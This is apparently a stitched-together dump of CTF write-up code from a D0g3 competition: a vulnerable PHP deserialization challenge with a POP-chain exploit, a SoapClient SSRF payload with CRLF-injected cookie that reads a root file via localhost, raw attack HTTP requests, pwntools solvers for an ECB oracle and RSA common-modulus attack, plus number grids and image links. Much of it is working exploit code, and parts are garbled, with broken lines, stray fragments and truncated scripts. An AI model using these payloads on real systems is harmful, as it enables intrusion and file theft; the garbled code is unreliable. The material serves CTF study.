1 1 1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 0 0 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 0 1 1 1 0 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 1 1 0 1 1 1 1 0 0 0 0 0 0 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 0 1 0 1 1 1 1 1 1 1 1 0 0 0 0 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 1 1 1 0 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 0 1 1 1 1 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 1 1 1 1 0 1 1 1 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 1 1 1 1 0 1 1 1 0 0 0  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 0 1 0 1 0 0  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 2
0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 0 1 1 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 0 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 0 0 0 1 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 0 0 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 0 1 1 1 0 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 1 1 0 1 1 1 1 0 0 0 0 0 0 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 0 1 0 1 1 1 1 1 1 1 1 0 0 0 0 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 1 1 1 0 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 0 1 1 1 1 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 1 1 1 1 0 1 1 1 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 1 1 1 1 0 1 1 1 0 0 0  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 0 1 0 1 0 0  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2 1 0 1 1 1 1
index.php
<?php
//something in flag.php

class A
{
    public $a;
    public $b;

    public function __wakeup()
    {
        $this->a = "babyhacker";
    }

    public function __invoke()
    {
        if (isset($this->a) && $this->a == md5($this->a)) {
            $this->b->uwant();
        }
    }
}

class B
{
    public $a;
    public $b;
    public $k;

    function __destruct()
    {
        $this->b = $this->k;
        die($this->a);
    }
}

class C
{
    public $a;
    public $c;

    public function __toString()
    {
        $cc = $this->c;
        return $cc();
    }
    public function uwant()
    {
        if ($this->a == "phpinfo") {
            phpinfo();
        } else {
            call_user_func(array(reset($_SESSION), $this->a));
        }
    }
}

if (isset($_GET['d0g3'])) {
    ini_set($_GET['baby'], $_GET['d0g3']);
    session_start();
    $_SESSION['sess'] = $_POST['sess'];
}
else{
    session_start();
    if (isset($_POST["pop"])) {
        unserialize($_POST["pop"]);
    }
}
var_dump($_SESSION);
highlight_file(__FILE__);
flag.php
<?php
session_start();
highlight_file(__FILE__);
//flag在根目录下
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
    $f1ag=implode(array(new $_GET['a']($_GET['b'])));
    $_SESSION["F1AG"]= $f1ag;
}else{
   echo "only localhost!!";
}
B::
__destruct()->C::
__toString()->A::
__invoke()->C::
uwant()
<?php
//something in flag.php

class A
{
    public $a = '0e215962017';
    public $b;

    public function __invoke()
    {
        if (isset($this->a) && $this->a == md5($this->a)) {
            $this->b->uwant();
        }
    }
}

class B
{
    public $a;
    public $b;
    public $k;

    function __destruct()
    {
        $this->b = $this->k;
        die($this->a);
    }
}

class C
{
    public $a ;
    public $c;

    public function __toString()
    {
        $cc = $this->c;
        return $cc();
    }
    public function uwant()
    {
        if ($this->a == "phpinfo") {
            phpinfo();
        } else {
            call_user_func(array(reset($_SESSION), $this->a));
        }
    }
}

session_start();
$_SESSION['sess'] = 'SoapClient';

$first = new B();
$first->a = new C();
$first->a->c = new A();
$first->a->c->b = new C();
$first->a->c->b->a = '11111';
print((serialize($first)));
//var_dump($_SESSION);
O:1:"B":3:{s:1:"a";O:1:"C":2:{s:1:"a";N;s:1:"c";O:1:"A":3:{s:1:"a";s:11:"0e215962017";s:1:"b";O:1:"C":2:{s:1:"a";s:5:"11111";s:1:"c";N;}}}s:1:"b";N;s:1:"k";N;}
<?php
$a = new SoapClient(null,
    array(
        'user_agent' => "aaarnCookie:
PHPSESSID=u6ljl69tjrbutbq4i0oeb0m332",  
        'uri' => 'bbb',
        // 'location' => 'http://127.0.0.1/flag.php?a=GlobIterator&b=/*f*' //首先用GlobIterator找flag的名字
        'location' => 'http://127.0.0.1/flag.php?a=SplFileObject&b=file:///f1111llllllaagg'
         
    )
);
$b = serialize($a);
echo urlencode($b);
?>
POST /?baby=session.serialize_handler&d0g3=php_serialize HTTP/1.1
Host: 47.108.29.107:
10356
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=u6ljl69tjrbutbq4i0oeb0m332
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 401

sess=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22bbb%22%3Bs%3A8%3A%22location%22%3Bs%3A67%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%3Fa%3DSplFileObject%26b%3Dfile%3A%2F%2F%2Ff1111llllllaagg%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A48%3A%22aaa%0D%0ACookie%3APHPSESSID%3Du6ljl69tjrbutbq4i0oeb0m332%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
POST /?baby&d0g3 HTTP/1.1
Host: 47.108.29.107:
10356
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=u6ljl69tjrbutbq4i0oeb0m332
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

sess=SoapClient
POST / HTTP/1.1
Host: 47.108.29.107:
10356
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=u6ljl69tjrbutbq4i0oeb0m332
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 163

pop=O:1:"B":3:{s:1:"a";O:1:"C":2:{s:1:"a";N;s:1:"c";O:1:"A":3:{s:1:"a";s:11:"0e215962017";s:1:"b";O:1:"C":2:{s:1:"a";s:5:"11111";s:1:"c";N;}}}s:1:"b";N;s:1:"k";N;}
GET / HTTP/1.1
Host: 47.108.29.107:
10356
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=u6ljl69tjrbutbq4i0oeb0m332
Connection: close
from pwn import *
from hashlib import *
from itertools import product
from string import *

r = remote("120.78.131.38",10001,level='debug')
_ = r.recvuntil("XXXX + ")
data = r.recvline().decode().strip('n').split("):")

l = string.ascii_letters + string.digits
for i,j,k,w in product(l,l,l,l):
    s = i+j+k+w+data[0]
    if sha256(s.encode()).hexdigest() == data[1]:
        print(s[:4])
        r.recvuntil('Give Me XXXX:n')
        r.sendline(s[:4])
        break

r.recvuntil("If you guessed right, I'll give you the flag!, You only have 6 chances (1~20)n")
for i in range(6):
    x = random.randrange(1,21)
    r.sendline(str(x).encode())
    try:
        r.recvuntil(b'wrong number, guess again:n')
    
except:
        r.interactive()
ls = ['']
for i in trange(16):
    s = ''
    for _ in ls:
        s += _
    print('s= '+s)
    for j in ll:
        r.recvuntil('You can input anything:n')
        r.sendline('00000000' + ('0'*(16-i-1)+s+j) + '0'*(16-i-1))
        r.recvuntil("Here is your cipher: b'")
        data = r.recvline()
        tmp = bytes.fromhex(data[:-2].decode())
        if tmp[16:32]==tmp[32:48]:
            ls.append(j)
            break
    print(ls,i)
assert ls[-1] == '}'
f2 = ''
for i in ls:
    f2 += i
print(f2)
f1 = ''
a = 'A' #a从 a-zA-Z0-9 多进程爆破
for j in trange(len(l)):
    for k in range(len(l)):
        r.recvuntil('You can input anything:n')
        f1 = 'D0g3{'+a+l[j]+l[k]
        r.sendline('00000000'+f1+'00000000')
        r.recvuntil("Here is your cipher: b'")
        tmp = bytes.fromhex(r.recvline()[:-2].decode())
        if tmp[:16] == tmp[16:32]:
            print(f1)
            sleep(10000)
from pwn import *
from hashlib import *
from itertools import product
from string import *
from tqdm import *
from Crypto.Util.Padding import pad
from Crypto.Util.number import *
from gmpy2 import *

r = remote("120.78.131.38",10010)
# ,level='debug'
_ = r.recvuntil("XXXX + ")
data = r.recvline().decode().strip('n').split("):")

l = string.ascii_letters + string.digits
for i,j,k,w in product(l,l,l,l):
    s = i+j+k+w+data[0]
    if sha256(s.encode()).hexdigest() == data[1]:
        print(s[:4])
        r.recvuntil('Give Me XXXX:n')
        r.sendline(s[:4])
        break

r.recvuntil('You must prove your identity to enter the palace ')
tmp = bytes.fromhex(r.recvline()[:-1].decode())
inti = pad(b'Whitfield__Diffie',16)
print(inti[:16],inti[16:])
C
r.send(data)
_ = r.recvuntil('Flag has been encrypted by Diffien')
num = r.recvuntil(')').decode().strip('n').strip('(').strip(')').split(', ')
print(num)
n, e1, e2, e3, c1, c2, c3 = [int(i) for i in num]

E = [0,0,0]
E[0] = GCD(e1,e2)
E[2] = GCD(e2,e3)
E[1] = GCD(e1,e3)

com, s0, s1 = gcdext(E[0]*E[1],E[0]*E[2])
assert s0*E[0]*E[1]+s1*E[0]*E[2] == E[0]
ce0 = pow(c1,s0,n)*pow(c2,s1,n)%n

com, s0, s1 = gcdext(E[0],E[1]*E[2])
assert s0*E[0]+s1*E[1]*E[2] == 1
m = pow(ce0,s0,n)*pow(c3,s1,n)%n
print(long_to_bytes(m))
from Crypto.Util.number import *
with open('Signal', 'r') as f:
    con = f.read()
print(long_to_bytes(int(con,2)))
# 发现压缩包头的特征。
from Crypto.Util.number import *
with open('Signal', 'r') as f:
    con = f.read()
with open('signal.zip', 'wb') as f2:
    f2.write(long_to_bytes(int(con,2)))
from PIL import Image
import os

IMAGES_PATH = 'signal~\'  # 图片集地址
IMAGES_FORMAT = ['.png', '.PNG']  # 图片格式
IMAGE_WIDTH = 100  # 每张小图片的大小
IMAGE_HEIGHT = 100  # 每张小图片的大小
IMAGE_ROW = 25  # 图片间隔，也就是合并成一张图后，一共有几行
IMAGE_COLUMN = 25  # 图片间隔，也就是合并成一张图后，一共有几列
IMAGE_SAVE_PATH = 'final.jpg'  # 图片转换后的地址

newimg = Image.new('RGB',(IMAGE_COLUMN * IMAGE_HEIGHT, IMAGE_ROW * IMAGE_WIDTH))
for y in range(25):
    for x in range(25):
        timg = Image.open(IMAGES_PATH + str(y*IMAGE_COLUMN + x) + '.png')
        newimg.paste(timg, (x*IMAGE_WIDTH, y*IMAGE_HEIGHT))
newimg.save('new.png')
key: 187J3X1&DX3906@!
D0g3{W3Lc0Me_T@_E4rth!!}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1669601476.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1669601478.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/8-1669601478.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/0-1669601478.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1669601479.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1669601479.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1669601479.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1669601480.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1669601480.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1669601481.png)